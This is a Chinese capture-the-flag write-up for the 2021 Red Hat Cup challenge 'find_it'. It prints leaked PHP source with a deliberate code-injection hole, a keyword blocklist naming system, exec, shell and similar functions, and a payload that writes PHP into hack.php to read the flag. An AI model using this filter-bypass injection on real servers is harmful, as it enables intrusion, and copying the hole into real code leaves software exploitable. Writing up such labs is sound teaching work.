# 原创
：  2021红帽杯 find_it

# 2021红帽杯 find_it

#### 2021红帽杯 find_it

## 考点

> 
备份文件、源码泄露


## 思路

> 
题目提示我们 `I Can't view my php files?!`，猜测是备份文件，御剑扫一下发现存在 `robots.txt`


> 
访问 `1ndexx.php`，发现并不存在；由于Linux平台下的存在 `.xxxx.php.swp`、`.xxxx.php.swo`、`.xxxx.php`等文件格式，尝试访问一下 `.1ndexx.php.swp`，存在源码泄露


> 
发现过滤了一堆东西，感觉没得啥子可以利用的点了，由于可以写入文件，没有过滤掉 `show_source`，我们利用 `&lt;?php%20show_source("fl"."ag.php");`将flag打印出来


## Payload

> 
1ndexx.php.swp文件源码


```
&lt;?php $link = mysql_connect('localhost', 'ctfhub', 'ctfhub'); ?&gt;
&lt;html&gt;
&lt;head&gt;
	&lt;title&gt;Hello worldd!&lt;/title&gt;
	&lt;style&gt;
	body {
		background-color: white;
		text-align: center;
		padding: 50px;
		font-family: "Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif;
	}

	#logo {
		margin-bottom: 40px;
	}
	&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;img id="logo" src="logo.png" /&gt;
	&lt;h1&gt;&lt;?php echo "Hello My freind!"; ?&gt;&lt;/h1&gt;
	&lt;?php if($link) { ?&gt;
		&lt;h2&gt;I Can't view my php files?!&lt;/h2&gt;
	&lt;?php } else { ?&gt;
		&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;
	&lt;?php } ?&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php

#Really easy...

$file=fopen("flag.php","r") or die("Unable 2 open!");

$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize("flag.php"));


$hack=fopen("hack.php","w") or die("Unable 2 open");

$a=$_GET['code'];

if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){
	die("you die");
}
if(strlen($a)&gt;33){
	die("nonono.");
}
fwrite($hack,$a);
fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);

fclose($file);
fclose($hack);
?&gt;

```

> 
Payload：


```
先利用 ?code=&lt;?=%20show_source("fl"."ag.php");?&gt; 写入php代码
再访问hack.php

```
